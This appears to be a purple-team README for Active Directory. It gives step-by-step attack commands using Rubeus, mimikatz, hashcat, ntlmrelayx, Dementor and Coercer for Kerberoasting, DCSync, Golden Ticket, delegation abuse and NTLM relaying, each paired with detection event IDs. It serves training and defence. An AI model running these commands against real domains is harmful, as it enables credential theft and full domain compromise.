# Cybersecurity Windows Purple Project Documentation
Cybersecurity Red team and Blue team tooling for ease of use during penetration test and purple team exercises. 

## Table of Contents

1. [Kerberoasting](#kerberoasting)
2. [AS-REProasting](#as-reproasting)
3. [GPP Passwords](#gpp-passwords)
4. [GPO Permissions/GPO Files](#gpo-permissionsgpo-files)
5. [Credentials in Shares](#credentials-in-shares)
6. [Credentials in Object Properties](#credentials-in-object-properties)
7. [DCSync](#dcsync)
8. [Golden Ticket](#golden-ticket)
9. [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
10. [Print Spooler & NTLM Relaying](#print-spooler--ntlm-relaying)
11. [Coercing Attacks & Unconstrained Delegation](#coercing-attacks--unconstrained-delegation)
12. [Object ACLs](#object-acls)
13. [PKI - ESC1](#pki---esc1)

---

## Kerberoasting
To obtain crackable tickets, we can use [Rubeus](https://github.com/GhostPack/Rubeus) 

`PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt`

We can use hashcat with the hash-mode (option -m) 13100 for a Kerberoastable TGS. 
We also pass a [dictionary file](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials) with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to a file called cracked.txt:

`hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"`

Alternatively, the captured TGS hashes can be cracked with John The Ripper:

`sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot`

*Detection*: When a TGS is requested, an event log with ID 4769 is generated.

## AS-REProasting
To obtain crackable hashes, we can use [Rubeus](https://github.com/GhostPack/Rubeus) we can obtain crackable hashes for user accounts that have the property Do not require "Kerberos preauthentication enabled".

`PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt`

For hashcat to be able to recognize the hash, we need to edit it by adding 23$ after $krb5asrep$:

`$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550`

We can now use hashcat with the hash-mode (option -m) 18200 for AS-REPRoastable hashes. We also pass a dictionary file with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to the file asrepcracked.txt:

`sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force`

*Detection*: When we executed Rubeus, an Event with ID 4768 was generated, signaling that a Kerberos Authentication ticket was generated

## GPP Passwords
When Microsoft released it with the Windows Server 2008, Group Policy Preferences (GPP) introduced the ability to store and use credentials in several scenarios, all of which AD stores in the policies directory in SYSVOL. AD stores all group policies in \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\

To abuse GPP Passwords, we will use the Get-GPPPassword function from PowerSploit, which automatically parses all XML files in the Policies folder in SYSVOL, picking up those with the cpassword property and decrypting them once detected:

`PS C:\Users\bob\Downloads> Import-Module .\Get-GPPPassword.ps1`
`PS C:\Users\bob\Downloads> Get-GPPPassword`

*Detection:* Once auditing is enabled, any access to the file will generate an Event with the ID 4663
## GPO Permissions/GPO Files
Use PowerShell to retrieve GPO permissions:

```powershell
Import-Module GroupPolicy
Get-GPPermission -Name "Default Domain Policy" -All
```
To add or remove GPO permissions:

```powershell
# Grant read access
Set-GPPermission -Name "Default Domain Policy" -TargetName "Domain Users" -TargetType Group -PermissionLevel GpoRead

# Remove permissions
Set-GPPermission -Name "Default Domain Policy" -TargetName "Domain Users" -TargetType Group -PermissionLevel None
```
GPOs are stored in the SYSVOL share. You can manually inspect and edit files if needed:

```powershell
# Navigate to the GPO directory
cd "\\domain.local\SYSVOL\domain.local\Policies"

# List policy folders (each GPO has its own GUID folder)
Get-ChildItem
```

> ⚠️ **Caution**: Direct editing of GPO files may lead to corruption or misconfiguration. Always test in a lab environment first.

*Detection*:
Fortunately, it is straightforward to detect when a GPO is modified. If Directory Service Changes auditing is enabled, then the event ID 5136 will be generated

## Credentials in Shares
Enumerating non-default network shares with [PowerView](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView) Module Invoke-ShareFinder. 

```powershell
Import-Module Powerview.ps1
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
```

A few automated tools exist, such as [SauronEye](https://github.com/vivami/SauronEye), which can parse a collection of files and pick up matching words.

Using Living Off the Land approach we can manualy parse files and match words with findstr. When running findstr, we will write a script that goes to a specified share and looks for keywords on various specified file extensions:

```powershell
# Define the UNC path to the share
$sharePath = "\\\\Server01.eagle.local\\dev$"

# File extensions to scan
$fileTypes = @("*.bat", "*.cmd", "*.ini", "*.config")

# Keyword to search for
$searchKeyword = "pass"

# Change to the network share
Set-Location $sharePath

# Loop through each file type and run the search
foreach ($fileType in $fileTypes) {
    Write-Host "Searching in file type: $fileType" -ForegroundColor Cyan
    Get-ChildItem -Recurse -Include $fileType -ErrorAction SilentlyContinue |
        ForEach-Object {
            $filePath = $_.FullName
            if (Select-String -Path $filePath -Pattern $searchKeyword -SimpleMatch -Quiet) {
                Write-Host "[+] Potential credential found in: $filePath" -ForegroundColor Yellow
            }
        }
}
```


*Detection*: Monitor successful logon with event ID 4624 for high priviledge accounts from unusual location.s (need to establish a baseline first)

## Credentials in Object Properties
A simple PowerShell script can query the entire domain by looking for specific search terms/strings in the Description or Info fields:'

```powershell
Function SearchUserClearTextInformation
{
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms)
    {
        $list += "(`$_.Description -like `"*$t*`")"
        $list += "(`$_.Info -like `"*$t*`")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}

```

We will run the script to hunt for the string pass:

`
PS C:\Users\bob\Downloads> SearchUserClearTextInformation -Terms "pass"
`

*Detection*: Look for abnormal logons,  we would expect events with event ID 4624/4625 (failed and successful logon) and 4768 (Kerberos TGT requested).


## DCSync
DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:

Replicating Directory Changes
Replicating Directory Changes All

Steps:
1. Run a Command Shell or Powershell as Admin:
2.  Use [Mimikatz](https://github.com/gentilkiwi/mimikatz) for performing DCSync. We can run it by specifying the username whose password hash we want to obtain if the attack is successful, in this case, the user 'Administrator':

`
C:\Mimikatz>mimikatz.exe # lsadump::dcsync /domain:eagle.local /user:Administrator
`

3.  Copy Credentials (e.g. Hash NTLM value)

It is possible to specify the /all parameter instead of a specific username, which will dump the hashes of the entire AD environment. We can perform pass-the-hash with the obtained hash and authenticate against any Domain Controller.


*Detection*: Detecting DCSync is easy because each Domain Controller replication generates an event with the ID 4662. We can pick up abnormal requests immediately by monitoring for this event ID and checking whether the initiator account is a Domain Controller. 
Either the property 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 or 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 is present in the event.

## Golden Ticket
To perform the Golden Ticket attack, we can use  [Mimikatz](https://github.com/gentilkiwi/mimikatz) with the following arguments:

/domain: The domain's name.

/sid: The domain's SID value.

/rc4: The password's hash of krbtgt.

/user: The username for which Mimikatz will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.)

/id: Relative ID (last part of SID) for the user for whom Mimikatz will issue the ticket.

Additionally, advanced threat agents mostly will specify values for the /renewmax and /endin arguments, as otherwise, Mimikatz will generate the ticket(s) with a lifetime of 10 years, making it very easy to detect by EDRs:

/renewmax: The maximum number of days the ticket can be renewed.

/endin: End-of-life for the ticket.

Steps:
1. First, we need to obtain the password's hash of krbtgt and the SID value of the Domain. We can utilize DCSync:

`mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt`

2. We will use the Get-DomainSID function from PowerView to obtain the SID value of the Domain:

```powershell
PS C:\Users\bob\Downloads> . .\PowerView.ps1
PS C:\Users\bob\Downloads> Get-DomainSID
```

3. Now, armed with all the required information, we can use Mimikatz to create a ticket for the account Administrator. The /ptt argument makes Mimikatz pass the ticket into the current session:

`
mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
`
4. The output shows that Mimikatz injected the ticket in the current session, and we can verify that by running the command klist (after exiting from Mimikatz):

`C:\Mimikatz>klist`


5.To verify that the ticket is working, we can list the content of the C$ share of DC1 using it:

`C:\Mimikatz>dir \\dc1\c$
`

*Detection*:Domain Controllers will not log events when a threat agent forges a Golden Ticket from a compromised machine. However, when attempting to access another system(s), we will see events for successful logon originating from the compromised machine. If we go back to the attack scenario, by running dir \\dc1\c$ at the end, we generated two TGS tickets on the Domain Controller: one for krbtgt and another for the Domain controller machine account. If SID filtering is enabled, we will get alerts with the event ID 4675 during cross-domain escalation.

## Kerberos Constrained Delegation
We will use the Get-NetUser function from [PowerView](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView) to enumerate user accounts that are trusted for constrained delegation in the domain:

```Powershell
PS C:\Users\bob\Downloads> Get-NetUser -TrustedToAuth
```

Look for user trusted to authenticate to a Domain Controller through HTTP in the msds-allowedtodelegate attribute. The HTTP service provides the ability to execute PowerShell Remoting. Therefore, any threat actor gaining control over web_service can request a Kerberos ticket for any user in Active Directory and use it to connect to the DC over PowerShell Remoting.

Before we request a ticket with Rubeus (which expects a password hash instead of cleartext for the /rc4 argument used subsequently) we need to get the password hash for the user with DCSync or other means...

`PS C:\Users\bob\Downloads> .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt`


To confirm that Rubeus injected the ticket in the current session, we can use the klist command:

`PS C:\Users\bob\Downloads> klist`

With the ticket being available, we can connect to the Domain Controller impersonating the account Administrator:

`PS C:\Users\bob\Downloads> Enter-PSSession dc1`

If the last step fails (we may need to do klist purge, obtain new tickets, and try again by rebooting the machine). We can also request tickets for multiple services with the /altservice argument, such as LDAP, CFIS, time, and host.

*Detection*: If a mature organization uses Privileged Access Workstations (PAWs), they should be alert to any privileged users not authenticating from those machines, proactively monitoring events with the ID 4624 (successful logon).

## Print Spooler & NTLM Relaying
In this attack path, we will relay the connection to another DC and perform DCSync (i.e., the first compromise technique listed). For the attack to succeed, SMB Signing on Domain Controllers must be turned off.

Steps:
1.To begin, we will configure [NTLMRelayx](https://github.com/dirkjanm/PKINITtools/tree/master) to forward any connections to DC2 and attempt to perform the DCSync attack:

`impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support`

2.Next, we need to trigger the PrinterBug using the Kali box with NTLMRelayx listening. To trigger the connection back, we'll use [Dementor](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py) (when running from a non-domain joined machine, any authenticated user credentials are required):

`python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123`

*Detection*:Exploiting the PrinterBug will leave traces of network connections toward the Domain Controller; however, they are too generic to be used as a detection mechanism.

In the case of using NTLMRelayx to perform DCSync, no event ID 4662 is generated (as mentioned in the DCSync section); however, to obtain the hashes as DC1 from DC2, there will be a successful logon event for DC1. This event originates from the IP address of the Kali machine, not the Domain Controller.

## Coercing Attacks & Unconstrained Delegation
Assuming that an attacker has gained administrative rights on a server configured for Unconstrained Delegation. We will use this server to capture the TGT, while Coercer will be executed from the Kali machine.

To identify systems configured for Unconstrained Delegation, we can use the Get-NetComputer function from [PowerView](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView) along with the -Unconstrained switch:

```Powershell
PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname
```

Identify accounts trusted for Unconstrained delegation (Domain Controllers are trusted by default). They would be a target for an adversary. In our scenario, we have already compromised WS001 and 'Bob', who has administrative rights on this host. We will start Rubeus in an administrative prompt to monitor for new logons and extract TGTs:

```Powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1
```

Next, we need to know the IP address of WS001, which we can be obtain by running ipconfig. Once known, we will switch to the Kali machine to execute [Coercer](https://github.com/p0dalirius/Coercer) towards DC1, while we force it to connect to WS001 if coercing is successful:

`Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local`

Now, if we switch to WS001 and look at the continuous output that Rubeus provide, there should be a TGT for DC1 available:

We can use this TGT for authentication within the domain, becoming the Domain Controller. From there onwards, DCSync is an obvious attack (among others).

One way of using the abovementioned TGT is through Rubeus, by passign the ticket for DC$1.

`PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...`

Then, a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section for all users.

`PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /all "`

*Detection*: The RPC Firewall from [zero networks](https://github.com/zeronetworks/rpcfirewall) is an excellent method of detecting the abuse of these functions and can indicate immediate signs of compromise; however, if we follow the general recommendations to not install third-party software on Domain Controllers then firewall logs are our best chance.

We can see plenty of incoming connections to the DC, followed up by outbound connections from the DC to the attacker machine; this process repeats a few times as Coercer goes through several different functions. All of the outbound traffic is destined for port 445.

Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports 139 and 445 is recommended so that the attacker cannot receive any coerced TGTs resulting in dropped traffic on those ports. Which then, can be used for detection as any unexpected dropped traffic to ports 139 or 445 from domain controllers is suspicious.

## Object ACLs

*Coming soon...*

## PKI - ESC1

*Coming soon...*


